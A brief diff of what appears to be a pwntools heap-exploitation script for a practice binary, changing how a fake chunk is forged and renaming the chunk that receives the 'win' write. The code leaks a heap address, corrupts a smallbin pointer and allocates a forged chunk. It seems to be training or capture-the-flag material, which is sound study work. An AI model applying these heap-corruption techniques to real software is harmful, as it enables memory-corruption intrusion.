@@ -53,7 +53,7 @@ heap = int(io.recvline(), 16)
 
 # Create fake chunk
 payload = flat(
-  elf.sym["user"],
+  0,
   0x0,
   heap,
   elf.sym["user"] - 0x10
@@ -76,8 +76,8 @@ edit(chunk_A, p64(0xdeadbeef) + p64(elf.sym["user"]))
 
 # Request fake chunk
 smallbin = malloc(0x98)
-winnchunk = malloc(0x98)
-edit(winnchunk, p64(0x0) * 4 + b"win")
+chunk_C = malloc(0x98)
+edit(chunk_C, p64(0x0) * 4 + b"win")
 
 # =============================================================================
 
